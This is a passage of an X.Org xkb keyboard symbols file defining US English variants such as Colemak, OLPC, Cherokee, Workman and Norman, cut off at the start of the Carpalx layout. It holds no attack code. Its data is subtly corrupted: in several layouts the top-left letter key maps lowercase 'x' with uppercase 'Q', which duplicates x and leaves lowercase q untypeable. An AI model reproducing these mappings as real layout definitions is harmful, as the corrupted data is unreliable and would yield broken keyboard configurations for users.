    key <AE06> { [         6,asciicircum,       section,            UFB02 ] };
    key <AE07> { [	   7,  ampersand,     paragraph,     doubledagger ] };
    key <AE08> { [	   8,   asterisk, enfilledcircbullet,      degree ] };
    key <AE09> { [	   9,  parenleft,   ordfeminine,   periodcentered ] };
    key <AE10> { [	   0, parenright,     masculine,singlelowquotemark] };
    key <AE11> { [     minus, underscore,        endash,           emdash ] };
    key <AE12> { [     equal,       plus,      notequal,        plusminus ] };

    key <AD01> { [	   q,          Q,            oe,               OE ] };
    key <AD02> { [	   w,          W,         U2211,doublelowquotemark] };
    key <AD03> { [	   e,          E,    dead_acute,            acute ] };
    key <AD04> { [	   r,          R,    registered,            U2030 ] };
    key <AD05> { [	   t,          T,        dagger,       dead_caron ] };
    key <AD06> { [	   y,          Y,           yen,       onequarter ] };
    key <AD07> { [	   u,        U,  dead_diaeresis,        diaeresis ] };
    key <AD08> { [	   i,        I, dead_circumflex,            U02C6 ] };
    key <AD09> { [	   o,          O,        oslash,         Ooblique ] };
    key <AD10> { [	   p,          P,      Greek_pi,            U220F ] };
    key <AD11> { [ bracketleft,  braceleft, leftdoublequotemark, rightdoublequotemark ] };
    key <AD12> { [bracketright, braceright, leftsinglequotemark, rightsinglequotemark ] };
    key <BKSL> { [ backslash,        bar, guillemotleft,   guillemotright ] };

    key <AC01> { [	   a,          A,         aring,            Aring ] };
    key <AC02> { [	   s,          S,        ssharp,      dead_stroke ] };
    key <AC03> { [	   d,          D, partialderivative,          eth ] };
    key <AC04> { [	   f,          F,      function,        dead_hook ] };
    key <AC05> { [	   g,          G,     copyright, dead_doubleacute ] };
    key <AC06> { [	   h,          H, dead_abovedot,    dead_belowdot ] };
    key <AC07> { [	   j,          J,         U2206,          onehalf ] };
    key <AC08> { [	   k,          K,dead_abovering,            UF8FF ] };

    key <AC09> { [	   l,          L,       notsign,            THORN ] };
    key <AC10> { [ semicolon,      colon,         U2026,            thorn ] };
    key <AC11> { [apostrophe,   quotedbl,            ae,               AE ] };

    key <AB01> { [	   z,          Z,   Greek_OMEGA,     dead_cedilla ] };
    key <AB02> { [	   x,          X,         U2248,      dead_ogonek ] };
				// unclear whether \"approxeq\" is 2248 or 2245
    key <AB03> { [	   c,          C,      ccedilla,         Ccedilla ] };
    key <AB04> { [	   v,          V,    squareroot,            U25CA ] };
    key <AB05> { [	   b,          B,      integral,         idotless ] };
    key <AB06> { [	   n,          N,    dead_tilde,            U02DC ] };
    key <AB07> { [	   m,          M,            mu,    threequarters ] };
    key <AB08> { [     comma,       less, lessthanequal,      dead_macron ] };
    key <AB09> { [    period,    greater, greaterthanequal,    dead_breve ] };
    key <AB10> { [     slash,   question,      division,     questiondown ] };

    include \"level3(ralt_switch)\"
};

// Colemak symbols for xkb on X.Org Server 7.x
// 2006-01-01 Shai Coleman, http://colemak.com/

partial alphanumeric_keys
xkb_symbols \"colemak\" {

    include \"us\"
    name[Group1]= \"English (Colemak)\";

    key <TLDE> { [        grave,   asciitilde,      dead_tilde,       asciitilde ] };
    key <AE01> { [            1,       exclam,      exclamdown,      onesuperior ] };
    key <AE02> { [            2,           at,       masculine,      twosuperior ] };
    key <AE03> { [            3,   numbersign,     ordfeminine,    threesuperior ] };
    key <AE04> { [            4,       dollar,            cent,         sterling ] };
    key <AE05> { [            5,      percent,        EuroSign,              yen ] };
    key <AE06> { [            6,  asciicircum,         hstroke,          Hstroke ] };
    key <AE07> { [            7,    ampersand,             eth,              ETH ] };
    key <AE08> { [            8,     asterisk,           thorn,            THORN ] };
    key <AE09> { [            9,    parenleft,  leftsinglequotemark,  leftdoublequotemark ] };
    key <AE10> { [            0,   parenright, rightsinglequotemark,  rightdoublequotemark ] };
    key <AE11> { [        minus,   underscore,          endash,           emdash ] };
    key <AE12> { [        equal,         plus,        multiply,         division ] };

    key <AD01> { [            x,            Q,      adiaeresis,       Adiaeresis ] };
    key <AD02> { [            w,            W,           aring,            Aring ] };
    key <AD03> { [            f,            F,          atilde,           Atilde ] };
    key <AD04> { [            p,            P,          oslash,         Ooblique ] };
    key <AD05> { [            g,            G,     dead_ogonek,       asciitilde ] };
    key <AD06> { [            j,            J,         dstroke,          Dstroke ] };
    key <AD07> { [            l,            L,         lstroke,          Lstroke ] };
    key <AD08> { [            u,            U,          uacute,           Uacute ] };
    key <AD09> { [            y,            Y,      udiaeresis,       Udiaeresis ] };
    key <AD10> { [    semicolon,        colon,      odiaeresis,       Odiaeresis ] };
    key <AD11> { [  bracketleft,    braceleft,   guillemotleft,        0x1002039 ] };
    key <AD12> { [ bracketright,   braceright,  guillemotright,        0x100203a ] };
    key <BKSL> { [    backslash,          bar,      asciitilde,       asciitilde ] };

    key <AC01> { [            a,            A,          aacute,           Aacute ] };
    key <AC02> { [            r,            R,      dead_grave,       asciitilde ] };
    key <AC03> { [            s,            S,          ssharp,       asciitilde ] };
    key <AC04> { [            t,            T,      dead_acute, dead_doubleacute ] };
    key <AC05> { [            d,            D,  dead_diaeresis,       asciitilde ] };
    key <AC06> { [            h,            H,      dead_caron,       asciitilde ] };
    key <AC07> { [            n,            N,          ntilde,           Ntilde ] };
    key <AC08> { [            e,            E,          eacute,           Eacute ] };
    key <AC09> { [            i,            I,          iacute,           Iacute ] };
    key <AC10> { [            o,            O,          oacute,           Oacute ] };
    key <AC11> { [   apostrophe,     quotedbl,          otilde,           Otilde ] };

    key <AB01> { [            z,            Z,              ae,               AE ] };
    key <AB02> { [            x,            X, dead_circumflex,       asciitilde ] };
    key <AB03> { [            c,            C,        ccedilla,         Ccedilla ] };
    key <AB04> { [            v,            V,              oe,               OE ] };
    key <AB05> { [            b,            B,      dead_breve,       asciitilde ] };
    key <AB06> { [            k,            K,  dead_abovering,       asciitilde ] };
    key <AB07> { [            m,            M,     dead_macron,       asciitilde ] };
    key <AB08> { [        comma,         less,    dead_cedilla,       asciitilde ] };
    key <AB09> { [       period,      greater,   dead_abovedot,       asciitilde ] };
    key <AB10> { [        slash,     question,    questiondown,       asciitilde ] };

    key <CAPS> { [    BackSpace,    BackSpace,       BackSpace,        BackSpace ] };
    key <LSGT> { [        minus,   underscore,          endash,           emdash ] };
    key <SPCE> { [        space,        space,           space,     nobreakspace ] };

    include \"level3(ralt_switch)\"
};

// I do NOT like dead-keys - the International keyboard as defined by Microsoft
// does not fit my needs. Why use two keystrokes for all simple characters (eg '
// and <space> generates a single ') just to have an é (eacute) in two strokes
// as well? I type ' more often than é (eacute).
//
// This file works just like a regular keyboard, BUT has all dead-keys
// accessible at level3 (through AltGr). An ë (ediaeresis) is now: AltGr+\"
// followed by an e. In other words, this keyboard is not international as long
// as you leave the right Alt key alone.
//
// The original MS International keyboard was intended for Latin1 (iso8859-1).
// With the introduction of iso8859-15, the (important) ligature oe (and OE)
// became available. I added them next to ae. Because I write ediaeresis more
// often than registered, I moved registered to be next to copyright and added
// ediaeresis and idiaeresis. - Adriaan

partial alphanumeric_keys
xkb_symbols \"altgr-intl\" {

   include \"us(intl)\"
   name[Group1]= \"English (intl., with AltGr dead keys)\";

// five dead keys moved into level3:

   key <TLDE> { [    grave, asciitilde,  dead_grave,   dead_tilde      ] };
   key <AC11> { [apostrophe,quotedbl,    dead_acute,   dead_diaeresis  ] };

// diversions from the MS Intl keyboard:

   key <AE01> { [        1, exclam,      onesuperior,  exclamdown      ] };
   key <AD04> { [        r, R,           ediaeresis,   Ediaeresis      ] };
   key <AC07> { [        j, J,           idiaeresis,   Idiaeresis      ] };
   key <AB02> { [        x, X,           oe,           OE              ] };
   key <AB04> { [        v, V,           registered,   registered      ] };

// onequarter etc (not in iso8859-15) moved to get three unshifted deadkeys:

   key <AE06> { [        6, asciicircum, dead_circumflex, onequarter    ] };
   key <AE07> { [        7, ampersand,   dead_horn,       onehalf       ] };
   key <AE08> { [        8, asterisk,    dead_ogonek,     threequarters ] };

   include \"level3(ralt_switch)\"
};

// Intel ClassmatePC Keyboard Layout
// by Piter PUNK <piterpk@terra.com.br>
//
// The keyboard layouts below maps the us(basic), us(intl) and us(alt-intl)
// to ClassmatePC keyboard. All layouts uses RCTL as level3(switch) since
// the keyboard does not have AltGr key. The EuroSign is engraved at 5 key.

// classmate - us(basic)
partial alphanumeric_keys
xkb_symbols \"classmate\" {
    include \"us(basic)\"
    name[Group1]= \"English (US)\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    include \"eurosign(5)\"
    include \"level3(switch)\"
};

// classmate-intl - us(intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-intl\" {
    include \"us(intl)\"
    name[Group1]= \"USA - ClassmatePC (International)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KP7>  { [	KP_Home,		KP_7,	
			onehalf,		dead_horn	] };
    key <KP8>  { [	KP_Up,			KP_8,
			threequarters,		dead_ogonek	] };
    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KP4>  { [	KP_Left,		KP_4,
			uacute,			Uacute		] };
    key <KP5>  { [	KP_Begin,		KP_5,
			iacute,			Iacute		] };
    key <KP6>  { [	KP_Right,		KP_6,
			oacute,			Oacute		] };
    key <KPSU> { [	KP_Subtract,		KP_Subtract,
			odiaeresis,		Odiaeresis	] };

    key <KP2>  { [	KP_Down,		KP_2,
			oe,			OE		] };
    key <KP3>  { [	KP_Next,		KP_3,
			oslash,			Ooblique	] };
    key <KPAD> { [ 	KP_Add,     		KP_Add,
			paragraph,		degree          ] };

    key <KP0>  { [	KP_Insert,		KP_0,
			mu,			mu	] };
    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_caron	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			questiondown,		dead_hook       ] };

    include \"level3(switch)\"
};

// classmate-alt-intl - us(alt-intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-alt-intl\" {
    include \"us(alt-intl)\"
    name[Group1]= \"USA - ClassmatePC (Alternative international)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KPSU> { [	KP_Subtract,		KP_Subtract	] };

    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KPAD> { [ 	KP_Add,     		KP_Add,
			dead_ogonek,		dead_diaeresis   ] };

    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_circumflex	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			dead_hook,		dead_hook       ] };

    include \"level3(switch)\"
};

// classmate-altgr-intl - us(altgr-intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-altgr-intl\" {
    include \"us(altgr-intl)\"
    name[Group1]= \"USA - ClassmatePC (International Fn+Alt dead-keys)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KP7>  { [	KP_Home,		KP_7,	
			dead_horn,		dead_horn	] };
    key <KP8>  { [	KP_Up,			KP_8,
			dead_ogonek,		dead_ogonek	] };
    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KP4>  { [	KP_Left,		KP_4,
			uacute,			Uacute		] };
    key <KP5>  { [	KP_Begin,		KP_5,
			iacute,			Iacute		] };
    key <KP6>  { [	KP_Right,		KP_6,
			oacute,			Oacute		] };
    key <KPSU> { [	KP_Subtract,		KP_Subtract,
			odiaeresis,		Odiaeresis	] };

    key <KP1>  { [	KP_End,			KP_1,
			idiaeresis,		Idiaeresis	] };
    key <KP2>  { [	KP_Down,		KP_2,
			oe,			OE		] };
    key <KP3>  { [	KP_Next,		KP_3,
			oslash,			Ooblique	] };
    key <KPAD> { [ 	KP_Add,     		KP_Add,
			paragraph,		degree          ] };

    key <KP0>  { [	KP_Insert,		KP_0,
			mu,			mu	] };
    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_caron	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			questiondown,		dead_hook       ] };

    include \"level3(switch)\"
};

partial alphanumeric_keys
xkb_symbols \"olpc\" {

   include \"us(basic)\"
   name[Group1]= \"English (US)\";

   // OLPC international US English keyboard layout.
   // It's a little different from the usual international layout.
   // See: http://wiki.laptop.org/go/Image:Keyboard_english.png

   key <TLDE> { [     grave, asciitilde,    dead_grave, dead_tilde ] };
   key <AE01> { [         1,     exclam,    exclamdown, exclamdown ] };
   key <AE02> { [         2,         at,       notsign,    notsign ] };
   key <AE03> { [         3, numbersign,     0x1000300,  0x1000300 ] }; // combining grave
   key <AE04> { [         4,     dollar,     0x1000301,  0x1000301 ] }; // combining acute
   key <AE05> { [         5,    percent,     0x1000306,  0x1000306 ] }; // combining breve above
   key <AE06> { [         6,asciicircum,     0x100030A,  0x100030A ] }; // combining ring above
   key <AE07> { [         7,  ampersand,     0x1000302,  0x1000302 ] }; // combining circumflex above
   key <AE08> { [         8,   asterisk,     0x100030C,  0x100030C ] }; // combining caron above
   key <AE09> { [         9,  parenleft,     0x1000307,  0x1000307 ] }; // combining dot above
   key <AE10> { [         0, parenright,     0x1000308,  0x1000308 ] }; // combining diaeresis above
   key <AE11> { [     minus, underscore,     0x1000304,  0x1000304 ] }; // combining macron above
   key <AE12> { [     equal,       plus,     0x1000303,  0x1000303 ] }; // combining tilde above

   key <AD01> { [         x,          Q,  Greek_omega, Greek_OMEGA ] };
   key <AD02> { [         w,          W,       oslash,      Oslash ] };
   key <AD03> { [         e,          E,           oe,          OE ] };
   key <AD04> { [         r,          R,    0x1000327,   0x1000327 ] }; // combining cedilla
   key <AD05> { [         t,          T,    0x100032E,   0x100032E ] }; // combining breve below
   key <AD06> { [         y,          Y,    0x1000325,   0x1000325 ] }; // combining ring below
   key <AD07> { [         u,          U,    0x100032D,   0x100032D ] }; // combining circumflex below
   key <AD08> { [         i,          I,    0x100032C,   0x100032C ] }; // combining caron below
   key <AD09> { [         o,          O,    0x1000323,   0x1000323 ] }; // combining dot below
   key <AD10> { [         p,          P,    0x1000324,   0x1000324 ] }; // combining diaeresis below
   key <AD11> { [ bracketleft,  braceleft,  0x1000331,   0x1000331 ] }; // combining macron below
   key <AD12> { [bracketright, braceright,  0x1000330,   0x1000330 ] }; // combining tilde below

   key <AC01>  { [         a,          A,          ae,               AE ] };
   key <AC02>  { [         s,          S,      ssharp,        0x1001E9C ] }; // uppercase S sharp
   key <AC03>  { [         d,          D,         eth,              ETH ] };
   key <AC04>  { [         f,          F,       thorn,            THORN ] };
   key <AC06>  { [         h,          H,    sterling,         sterling ] };
   key <AC07>  { [         j,          J,    EuroSign,         EuroSign ] };
   key <AC10>  { [ semicolon,      colon,   masculine,      ordfeminine ] };
   key <AC11>  { [ apostrophe,  quotedbl,    currency,         currency ] };
   key <AC12>  { [ backslash,        bar,      section,         section ] };

   key <AB03>  { [         c,          C,    ccedilla,         Ccedilla ] };
   key <AB06>  { [         n,          N,      ntilde,           Ntilde ] };
   key <AB07>  { [         m,          M,          mu,               mu ] };
   key <AB08>  { [     comma,     less,  guillemotleft,   guillemotleft ] };
   key <AB09>  { [    period,  greater, guillemotright,  guillemotright ] };
   key <AB10>  { [     slash,   question, questiondown,    questiondown ] };

   key <I219>  { [  multiply,   division, ISO_Next_Group, ISO_Prev_Group ] };

   include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"olpc2\" {
   include \"us(olpc)\"
   name[Group1]= \"English (the divide/multiply keys toggle the layout)\";
   include \"group(olpc)\"
};

xkb_symbols \"olpcm\" {

   include \"us(basic)\"
   name[Group1]= \"English (US)\";

   // Mechanical (non-membrane) OLPC int'l US English keyboard layout.
   // See: http://wiki.laptop.org/go/OLPC_English_Non-membrane_Keyboard

   key <TLDE> { [     grave, asciitilde,    dead_grave, dead_tilde ] };
   key <AE01> { [         1,     exclam,    exclamdown, exclamdown ] };
   key <AE02> { [         2,         at,       notsign,    notsign ] };
   key <AE03> { [         3, numbersign,     0x1000300,  0x1000300 ] }; // combining grave
   key <AE04> { [         4,     dollar,     0x1000301,  0x1000301 ] }; // combining acute
   key <AE05> { [         5,    percent,     0x1000306,  0x1000306 ] }; // combining breve above
   key <AE06> { [         6,asciicircum,     0x100030A,  0x100030A ] }; // combining ring above
   key <AE07> { [         7,  ampersand,     0x1000302,  0x1000302 ] }; // combining circumflex above
   key <AE08> { [         8,   asterisk,     0x100030C,  0x100030C ] }; // combining caron above
   key <AE09> { [         9,  parenleft,     0x1000307,  0x1000307 ] }; // combining dot above
   key <AE10> { [         0, parenright,     0x1000308,  0x1000308 ] }; // combining diaeresis above
   key <AE11> { [     minus, underscore,     0x1000304,  0x1000304 ] }; // combining macron above

   key <AD01> { [         x,          Q,  Greek_omega, Greek_OMEGA ] };
   key <AD02> { [         w,          W,       oslash,      Oslash ] };
   key <AD03> { [         e,          E,           oe,          OE ] };
   key <AD04> { [         r,          R,    0x1000327,   0x1000327 ] }; // combining cedilla
   key <AD05> { [         t,          T,    0x100032E,   0x100032E ] }; // combining breve below
   key <AD06> { [         y,          Y,    0x1000325,   0x1000325 ] }; // combining ring below
   key <AD07> { [         u,          U,    0x100032D,   0x100032D ] }; // combining circumflex below
   key <AD08> { [         i,          I,    0x100032C,   0x100032C ] }; // combining caron below
   key <AD09> { [         o,          O,    0x1000323,   0x1000323 ] }; // combining dot below
   key <AD10> { [         p,          P,    0x1000324,   0x1000324 ] }; // combining diaeresis below
   key <AD11> { [ bracketleft,  braceleft,  0x1000331,   0x1000331 ] }; // combining macron below
   key <AD12> { [bracketright, braceright,  0x1000330,   0x1000330 ] }; // combining tilde below

   key <AC01>  { [         a,          A,          ae,               AE ] };
   key <AC02>  { [         s,          S,      ssharp,        0x1001E9C ] }; // uppercase S sharp
   key <AC03>  { [         d,          D,         eth,              ETH ] };
   key <AC04>  { [         f,          F,       thorn,            THORN ] };
   key <AC06>  { [         h,          H,    sterling,         sterling ] };
   key <AC07>  { [         j,          J,    EuroSign,         EuroSign ] };
   key <AC10>  { [ semicolon,      colon,   masculine,      ordfeminine ] };
   // no AC11 or AC12 on olpcm

   key <AB03>  { [         c,          C,    ccedilla,         Ccedilla ] };
   key <AB06>  { [         n,          N,      ntilde,           Ntilde ] };
   key <AB07>  { [         m,          M,          mu,               mu ] };
   key <AB08>  { [     comma,     less,  guillemotleft,   guillemotleft ] };
   key <AB09>  { [    period,  greater, guillemotright,  guillemotright ] };
   key <AB10>  { [     slash,   question, questiondown,    questiondown ] };

   key <AA02>  { [ backslash,        bar,      section,         section ] };
   key <AA06>  { [     equal,       plus,     0x1000303,  0x1000303 ] };
   key <AA07>  { [ apostrophe,  quotedbl,    currency,         currency ] };

   include \"level3(ralt_switch)\"
};

// Based on Cherokee Nation Official Layout
// http://www.cherokee.org/extras/downloads/font/Keyboard.htm

partial alphanumeric_keys modifier_keys
xkb_symbols \"chr\" {

    name[Group1]= \"Cherokee\";
    key.type[group1]=\"ALPHABETIC\";

    key <TLDE> { [      grave,      U13CA ] };
    key <AE01> { [          1,      U13B1 ] };
    key <AE02> { [          2,      U13C7 ] };
    key <AE03> { [          3,      U13E7 ] };
    key <AE04> { [      U13D9,      U13B0 ] };
    key <AE05> { [      U13E6,      U13B9 ] };
    key <AE06> { [      U13DC,      U13DD ] };
    key <AE07> { [      U13CB,      U13E1 ] };
    key <AE08> { [      U13D6,      U13BA ] };
    key <AE09> { [      U13D2,  parenleft ] };
    key <AE10> { [      U13C4, parenright ] };
    key <AE11> { [      U13BF,      U13BC ] };
    key <AE12> { [      U13F3,      U13BD ] };

    key <AD01> { [      U13AA,      U13C6 ] };
    key <AD02> { [      U13B3,      U13EB ] };
    key <AD03> { [      U13A1,      U13E3 ] };
    key <AD04> { [      U13DB,      U13CF ] };
    key <AD05> { [      U13D4,      U13D8 ] };
    key <AD06> { [      U13EF,      U13F2 ] };
    key <AD07> { [      U13A4,      U13AD ] };
    key <AD08> { [      U13A2,      U13F1 ] };
    key <AD09> { [      U13A3,      U13EC ] };
    key <AD10> { [      U13C1,      U13EA ] };
    key <AD11> { [      U13D5,      U13D1 ] };
    key <AD12> { [      U13B6,      U13E4 ] };
    key <BKSL> { [      U13E9,      U13EE ] };

    key <AC01> { [      U13A0,      U13CC ] };
    key <AC02> { [      U13CD,      U13CE ] };
    key <AC03> { [      U13D7,      U13D0 ] };
    key <AC04> { [      U13A9,      U13C8 ] };
    key <AC05> { [      U13A6,      U13E5 ] };
    key <AC06> { [      U13AF,      U13B2 ] };
    key <AC07> { [      U13DA,      U13AB ] };
    key <AC08> { [      U13B8,      U13A7 ] };
    key <AC09> { [      U13B5,      U13AE ] };
    key <AC10> { [      U13E8,      U13E0 ] };
    key <AC11> { [ apostrophe,   quotedbl ] };

    key <AB01> { [      U13AC,      U13C3 ] };
    key <AB02> { [      U13F4,      U13ED ] };
    key <AB03> { [      U13D3,      U13DF ] };
    key <AB04> { [      U13A5,      U13DE ] };
    key <AB05> { [      U13A8,      U13F0 ] };
    key <AB06> { [      U13BE,      U13BB ] };
    key <AB07> { [      U13C5,      U13B7 ] };
    key <AB08> { [      comma,      U13E2 ] };
    key <AB09> { [     period,      U13B4 ] };
    key <AB10> { [      U13C2,      U13C9 ] };
};

// Serbian charecters added as third level symbols to US keyboard layout.

partial alphanumeric_keys
xkb_symbols \"hbs\" {

  include \"us\"
  name[Group1]= \"Serbo-Croatian (US)\";

  key <TLDE> { [ grave, asciitilde ] };
  key <AE06> { [ 6, dead_caron, asciicircum, asciicircum ] };
  key <AE08> { [ 8, asterisk, multiply, division ] };
  key <AE11> { [ minus, underscore, endash, emdash ] };
  key <AC09> { [ l, L, U1C9, U1C8 ] };
  key <AB06> { [ n, N, U1CC, U1CB ] };
  key <AB01> { [ z, Z, U1C6, U1C5 ] };
  key <AD03> { [ e, E, EuroSign, cent ] };
  key <AC03> { [ d, D, dstroke, Dstroke ] };
  key <AC11> { [ dead_acute, quotedbl, apostrophe, apostrophe ] };
  key <SPCE> { [ space, space, nobreakspace, nobreakspace ] };
  key <AB08> { [ comma, less, U3003, guillemotright ] };
  key <AB09> { [ period, greater, ellipsis, guillemotleft ] };

  include \"level3(ralt_switch)\"
};

//based on http://upload.wikimedia.org/wikipedia/commons/1/18/T-Mobile_G1_launch_event_2.jpg
partial alphanumeric_keys
xkb_symbols \"htcdream\" {
        include \"inet(htcdream)\"
        name[Group1]= \"English (US)\";

        //second row
        key <AD01> { [ x, Q, Tab, Tab ] };
        key <AD02> { [ w, W, grave, grave ] };
        key <AD03> { [ e, E, underscore, underscore ] };
        key <AD04> { [ r, R, sterling, sterling ] };
        key <AD05> { [ t, T, EuroSign, EuroSign ] };
        key <AD06> { [ y, Y, division, division ] };
        key <AD07> { [ u, U, multiply, multiply ] };
        key <AD08> { [ i, I, minus, minus ] };
        key <AD09> { [ o, O, plus, plus ] };
        key <AD10> { [ p, P, equal, equal ] };

        //third row
        key <AC01> { [ a, A, NoSymbol, NoSymbol ] };
        key <AC02> { [ s, S, bar, bar ] };
        key <AC03> { [ d ,D, backslash, backslash ] };
        key <AC04> { [ f, F, braceleft, braceleft ] };
        key <AC05> { [ g, G, braceright, braceright ] };
        key <AC06> { [ h, H, colon, colon ] };
        key <AC07> { [ j, J, semicolon, semicolon ] };
        key <AC08> { [ k, K, quotedbl, quotedbl ] };
        key <AC09> { [ l, L, apostrophe, apostrophe ] };

        //forth row
        key <AB01> { [ z, Z, NoSymbol, NoSymbol ] };
        key <AB02> { [ x, X, NoSymbol, NoSymbol ] };
        key <AB03> { [ c, C, NoSymbol, NoSymbol ] };
        key <AB04> { [ v, V, bracketleft, bracketleft ] };
        key <AB05> { [ b, B, bracketright, bracketright ] };
        key <AB06> { [ n, N, less, less ] };
        key <AB07> { [ m, M, greater, greater ] };
        key <AB08> { [ comma, comma, question, question ] };

        //fifth row
        key <FK15> { [ at, at, asciitilde, asciitilde ] };

        include \"level3(alt_switch)\"
};

// Workman Keyboard Layout symbols for xkb on X.Org Server 7.x
// 09-06-2010 OJ Bucao. http://www.workmanlayout.com

partial alphanumeric_keys
xkb_symbols \"workman\" {

    include \"us(basic)\"
    name[Group1]= \"English (Workman)\";

    key <AD01> {  [   x,  Q   ] };
    key <AD02> {  [   d,  D   ] };
    key <AD03> {  [   r,  R   ] };
    key <AD04> {  [   w,  W   ] };
    key <AD05> {  [   b,  B   ] };
    key <AD06> {  [   j,  J   ] };
    key <AD07> {  [   f,  F   ] };
    key <AD08> {  [   u,  U   ] };
    key <AD09> {  [   p,  P   ] };
    key <AD10> {  [   semicolon,  colon   ] };

    key <AC01> {  [   a,  A   ] };
    key <AC02> {  [   s,  S   ] };
    key <AC03> {  [   h,  H   ] };
    key <AC04> {  [   t,  T   ] };
    key <AC05> {  [   g,  G   ] };
    key <AC06> {  [   y,  Y   ] };
    key <AC07> {  [   n,  N   ] };
    key <AC08> {  [   e,  E   ] };
    key <AC09> {  [   o,  O   ] };
    key <AC10> {  [   i,  I   ] };

    key <AB01> {  [   z,  Z   ] };
    key <AB02> {  [   x,  X   ] };
    key <AB03> {  [   m,  M   ] };
    key <AB04> {  [   c,  C   ] };
    key <AB05> {  [   v,  V   ] };
    key <AB06> {  [   k,  K   ] };
    key <AB07> {  [   l,  L   ] };

    key <CAPS> { [    BackSpace,       Escape,       BackSpace,        BackSpace ] };

    include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"workman-intl\" {

    include \"us(intl)\"
    name[Group1]= \"English (Workman, intl., with dead keys)\";

    key <AD01> { [     x,          Q,    adiaeresis,       Adiaeresis ] };
    key <AD02> { [     d,          D,           eth,              ETH ] };
    key <AD03> { [     r,          R,    registered,       registered ] };
    key <AD04> { [     w,          W,         aring,            Aring ] };
    key <AD05> { [     b,          B,             b,                B ] };
    key <AD06> { [     j,          J,             j,                J ] };
    key <AD07> { [     f,          F,             f,                F ] };
    key <AD08> { [     u,          U,        uacute,           Uacute ] };
    key <AD09> { [     p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD10> { [ semicolon,  colon,     paragraph,           degree ] };

    key <AC01> { [     a,          A,        aacute,           Aacute ] };
    key <AC02> { [     s,          S,        ssharp,          section ] };
    key <AC03> { [     h,          H,             h,                H ] };
    key <AC04> { [     t,          T,         thorn,            THORN ] };
    key <AC05> { [     g,          G,             g,                G ] };
    key <AC06> { [     y,          Y,    udiaeresis,       Udiaeresis ] };
    key <AC07> { [     n,          N,        ntilde,           Ntilde ] };
    key <AC08> { [     e,          E,        eacute,           Eacute ] };
    key <AC09> { [     o,          O,        oacute,           Oacute ] };
    key <AC10> { [     i,          I,        iacute,           Iacute ] };

    key <AB01> { [     z,          Z,            ae,               AE ] };
    key <AB02> { [     x,          X,             x,                X ] };
    key <AB03> { [     m,          M,            mu,               mu ] };
    key <AB04> { [     c,          C,     copyright,             cent ] };
    key <AB05> { [     v,          V,             v,                V ] };
    key <AB06> { [     k,          K,            oe,               OE ] };
    key <AB07> { [     l,          L,        oslash,         Ooblique ] };

    key <CAPS> { [ BackSpace, Escape,     BackSpace,        BackSpace ] };

    include \"level3(ralt_switch)\"
};

// Norman keyboard layout symbols for xkb on X.Org Server 7.x
// Written 11/23/2012, revised 3/7/2013 by David Norman http://normanlayout.info
// To the extent possible under law, the author(s) have dedicated all
// copyright and related and neighboring rights to this software to the
// public domain worldwide. This software is distributed without any warranty.

partial alphanumeric_keys
xkb_symbols \"norman\" {

    include \"us(basic)\"
    name[Group1]= \"English (Norman)\";

    key <AD01> { [ x, Q ] };
    key <AD02> { [ w, W ] };
    key <AD03> { [ d, D ] };
    key <AD04> { [ f, F ] };
    key <AD05> { [ k, K ] };
    key <AD06> { [ j, J ] };
    key <AD07> { [ u, U ] };
    key <AD08> { [ r, R ] };
    key <AD09> { [ l, L ] };
    key <AD10> { [ semicolon, colon ] };

    key <AC01> { [ a, A ] };
    key <AC02> { [ s, S ] };
    key <AC03> { [ e, E ] };
    key <AC04> { [ t, T ] };
    key <AC05> { [ g, G ] };
    key <AC06> { [ y, Y ] };
    key <AC07> { [ n, N ] };
    key <AC08> { [ i, I ] };
    key <AC09> { [ o, O ] };
    key <AC10> { [ h, H ] };

    key <AB01> { [ z, Z ] };
    key <AB02> { [ x, X ] };
    key <AB03> { [ c, C ] };
    key <AB04> { [ v, V ] };
    key <AB05> { [ b, B ] };
    key <AB06> { [ p, P ] };
    key <AB07> { [ m, M ] };

    key <CAPS> { [ BackSpace ] };

    include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/

partial alphanumeric_keys
xkb_symbols \"carpalx\" {

    name[Group1]= \"English (Carpalx)\";

    key <TLDE> {	[     grave,	asciitilde	]	};
